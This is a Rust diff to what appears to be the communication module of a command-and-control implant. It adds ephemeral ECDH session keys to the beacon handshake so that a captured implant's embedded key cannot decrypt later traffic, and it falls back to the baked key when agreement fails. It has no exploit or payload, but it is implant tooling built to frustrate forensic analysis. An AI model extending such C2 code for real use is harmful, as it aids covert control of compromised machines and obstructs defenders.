@@ -100,16 +100,28 @@ pub struct Session {
     contact_counter: u64,
 }
 
-/// The per-artifact contact seal split into its wire halves.
+/// The per-artifact contact seal split into its wire halves, carrying the
+/// session-key arm's state (architecture.md Sec 9): the agreed session keys
+/// once a handshake agreed them, and the pending ephemeral while an offer is
+/// out. Before the agreement every body seals under the baked key; after it,
+/// every body seals under the session keys -- so the key a seized artifact
+/// surrenders never opens the traffic that followed.
 pub struct Seal {
     pub key_id: [u8; 16],
     pub key: [u8; 32],
+    session: Option<envelope::SessionKeys>,
+    pending: Option<p256::ecdh::EphemeralSecret>,
 }
 
 impl Seal {
     pub fn parse(baked: &str) -> Option<Seal> {
         let (key_id, key) = envelope::parse_baked_key(baked)?;
-        Some(Seal { key_id, key })
+        Some(Seal {
+            key_id,
+            key,
+            session: None,
+            pending: None,
+        })
     }
 
     pub fn seal(&self, plaintext: &[u8], aad: &str) -> Vec<u8> {
@@ -118,6 +130,73 @@ impl Seal {
 
     pub fn open(&self, body: &[u8], aad: &str) -> Option<Vec<u8>> {
         envelope::try_open_contact_body(body, &self.key_id, &self.key, aad)
+    }
+
+    /// True while the arm has not agreed a session: the contact that carries
+    /// the handshake next must offer the ephemeral and carry nothing else.
+    pub fn needs_agreement(&self) -> bool {
+        self.session.is_none()
+    }
+
+    /// True while the agreed session keys are the active seal -- the body and
+    /// refusal paths that key on it.
+    pub fn holds_session(&self) -> bool {
+        self.session.is_some()
+    }
+
+    /// Mints the ephemeral offer a handshake carries: an uncompressed SEC1
+    /// P-256 public point (0x04 || X || Y). The private half waits on the
+    /// seal for the answer that completes the agreement.
+    pub fn mint_offer(&mut self) -> Vec<u8> {
+        let secret = p256::ecdh::EphemeralSecret::random(&mut rand::thread_rng());
+        let point = secret.public_key().to_sec1_bytes().to_vec();
+        self.pending = Some(secret);
+        point
+    }
+
+    /// Completes the agreement against the server's echoed public point:
+    /// derives the session keys from the ephemeral pair and the baked key
+    /// (the salt -- the root the session binds to). False when the echo is
+    /// not a valid point or no offer was out; the caller keeps the baked-key
+    /// seal, the negotiated-arm fallback.
+    pub fn agree(&mut self, server_point: &[u8], implant_id: &str) -> bool {
+        let Some(secret) = self.pending.take() else {
+            return false;
+        };
+        let Ok(server) = p256::PublicKey::from_sec1_bytes(server_point) else {
+            return false;
+        };
+        let shared = secret.diffie_hellman(&server);
+        self.session = Some(envelope::derive_session_keys(
+            shared.raw_secret_bytes(),
+            &self.key,
+            &self.key_id,
+            implant_id,
+        ));
+        true
+    }
+
+    /// Drops the agreed session keys -- the fallback a refused session body
+    /// or a dead connection triggers, so the next contact offers a fresh
+    /// agreement under the baked key instead of wedging on keys the server
+    /// no longer holds.
+    pub fn drop_session(&mut self) {
+        self.session = None;
+        self.pending = None;
+    }
+
+    /// Seals a body under the agreed session's request direction.
+    pub fn seal_session(&self, plaintext: &[u8], aad: &str) -> Option<Vec<u8>> {
+        self.session
+            .as_ref()
+            .map(|keys| envelope::seal_session_body(plaintext, keys, aad))
+    }
+
+    /// Opens a body under the agreed session's response direction.
+    pub fn open_session(&self, body: &[u8], aad: &str) -> Option<Vec<u8>> {
+        self.session
+            .as_ref()
+            .and_then(|keys| envelope::try_open_session_body(body, keys, aad))
     }
 }
 
@@ -246,9 +325,17 @@ impl Session {
 
     /// The handshake this run opens every contact with: identity, protocol
     /// version, both negotiation arms, and the fresh cadence (architecture.md
-    /// Sec 10.3 -- one advertisement rides each contact).
+    /// Sec 10.3 -- one advertisement rides each contact). When the seal has
+    /// not yet agreed a session, the handshake carries the session-key arm's
+    /// ephemeral offer too (Sec 9) -- and by the arm's contract that contact
+    /// carries its handshake and nothing else.
     pub fn handshake_frame(&mut self) -> Frame {
         let (sleep, jitter) = *self.cadence.lock().expect("cadence");
+        let session_public = self
+            .seal
+            .as_mut()
+            .filter(|seal| seal.needs_agreement())
+            .map(|seal| seal.mint_offer());
         Frame {
             payload: HandshakeRequest {
                 version: Some(ProtocolVersion { major: 1, minor: 0 }),
@@ -258,14 +345,36 @@ impl Session {
                 task_acks: Some(true),
                 sleep_seconds: Some(sleep),
                 jitter_seconds: Some(jitter),
+                session_public,
             }
             .encode_to_vec(),
             kind: 0,
         }
     }
 
-    /// Reads the handshake answer: negotiates the nonce arm and returns the
-    /// ack arm plus the run decision.
+    /// True while the next contact must be the agreement contact: the seal
+    /// carries the arm and no session keys are held. The carriages consult
+    /// this before assembling a body -- the offer rides alone.
+    pub fn needs_agreement(&self) -> bool {
+        self.seal
+            .as_ref()
+            .is_some_and(|seal| seal.needs_agreement())
+    }
+
+    /// Drops the agreed session keys (the fallback a refusal or a dead
+    /// connection triggers); a sealed run without keys re-offers on its next
+    /// contact. A plaintext run has nothing to drop.
+    pub fn drop_session_keys(&mut self) {
+        if let Some(seal) = self.seal.as_mut() {
+            seal.drop_session();
+        }
+    }
+
+    /// Reads the handshake answer: negotiates the nonce arm, completes the
+    /// session-key agreement when the answer echoes the server's ephemeral
+    /// (an unechoed offer keeps the baked-key seal -- the negotiated-arm
+    /// fallback an older server answers with), and returns the ack arm plus
+    /// the run decision.
     pub fn handshake_answered(&mut self, frame: &Frame) -> Result<(bool, Attempt), &'static str> {
         let answer = HandshakeResponse::decode(frame.payload.as_ref())
             .map_err(|_| "the handshake answer was malformed")?;
@@ -273,35 +382,50 @@ impl Session {
             return Ok((false, Attempt::Refused));
         }
         self.nonces.negotiated = answer.replay_nonces.unwrap_or(false);
+        if let (Some(seal), Some(server)) = (
+            self.seal.as_mut().filter(|seal| seal.needs_agreement()),
+            answer.session_public,
+        ) {
+            // The answer only completes an agreement its contact offered; a
+            // stale echo against keys already held is not one.
+            seal.agree(&server, &self.implant_id);
+        }
         Ok((answer.task_acks.unwrap_or(false), Attempt::Crossed))
     }
 
     /// Encodes frames as this run's outgoing body: the framed bytes behind a
     /// fresh big-endian counter, sealed under the bake's key when it carries
-    /// one; the counter burns per attempt, not per delivery, so a
-    /// retransmission never trips the server's replay floor.
+    /// one -- under the agreed session keys once the arm agreed them; the
+    /// counter burns per attempt, not per delivery, so a retransmission never
+    /// trips the server's replay floor.
     pub fn encode_outgoing(&mut self, frames: &[Frame]) -> (Vec<u8>, &'static str) {
         let encoded = crate::wire::encode(frames);
-        match &self.seal {
+        match self.seal.as_ref() {
             Some(seal) => {
                 self.contact_counter += 1;
                 let mut plaintext = Vec::with_capacity(8 + encoded.len());
                 plaintext.extend_from_slice(&self.contact_counter.to_be_bytes());
                 plaintext.extend_from_slice(&encoded);
-                (
-                    seal.seal(&plaintext, envelope::CONTACT_REQUEST_AAD),
-                    "text/plain",
-                )
+                let body = if seal.holds_session() {
+                    seal.seal_session(&plaintext, envelope::CONTACT_REQUEST_AAD)
+                } else {
+                    Some(seal.seal(&plaintext, envelope::CONTACT_REQUEST_AAD))
+                };
+                (body.expect("the active seal always seals"), "text/plain")
             }
             None => (encoded, "application/octet-stream"),
         }
     }
 
     /// Decodes an incoming body: sealed under the response's own purpose tag
-    /// when the run seals, else the plaintext frames. A body that does not
+    /// when the run seals -- under the agreed session's response key once the
+    /// arm agreed them -- else the plaintext frames. A body that does not
     /// verify is a dropped cycle -- nothing inside it is acted on.
-    pub fn decode_incoming(&self, body: &[u8]) -> Option<Vec<Frame>> {
-        let plaintext = match &self.seal {
+    pub fn decode_incoming(&self, body: &[u8]) -> Option<Vec<crate::wire::Frame>> {
+        let plaintext = match self.seal.as_ref() {
+            Some(seal) if seal.holds_session() => {
+                seal.open_session(body, envelope::CONTACT_RESPONSE_AAD)?
+            }
             Some(seal) => seal.open(body, envelope::CONTACT_RESPONSE_AAD)?,
             None => body.to_vec(),
         };
@@ -867,6 +991,8 @@ mod tests {
         let mut session = bare_session(Some(Seal {
             key_id: [0x11; 16],
             key: [0x22; 32],
+            session: None,
+            pending: None,
         }));
         let handshake = session.handshake_frame();
         let first = session.encode_outgoing(&[handshake]).0;
